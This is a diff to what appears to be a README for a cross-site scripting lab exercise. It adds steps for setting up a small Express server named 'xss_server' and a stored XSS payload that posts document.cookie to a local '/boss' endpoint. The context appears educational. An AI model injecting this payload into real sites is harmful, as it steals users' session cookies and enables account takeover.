@@ -138,6 +138,41 @@ Then it will show this the pop up message pop with the ```"hahaha"```
 
 ![pic4](app/assets/images/img4.png)
 
+##Create another using node
+first create a folder to keep node for me i name the folder as "xxs" then install:
+
+```bash
+$ npm install
+```
+
+to run node use command:
+
+```bash
+$ node index.js
+```
+
+I also add this into **package.json**:
+
+```json
+{
+  "name": "xss_server",
+  "version": "1.0.0",
+  "description": "",
+  "dependencies": {
+    "body-parser": "^1.15.0",
+    "express": "^4.13.4",
+    "lowdb": "^0.12.5"
+  }
+}
+
+```
+to send data i put this into content:
+
+```java
+<script type="text/javascript">
+$.post( "http://localhost:5000/boss", {cookie_data: document.cookie});
+</script>
+```
 
 ##Answer the Question
 
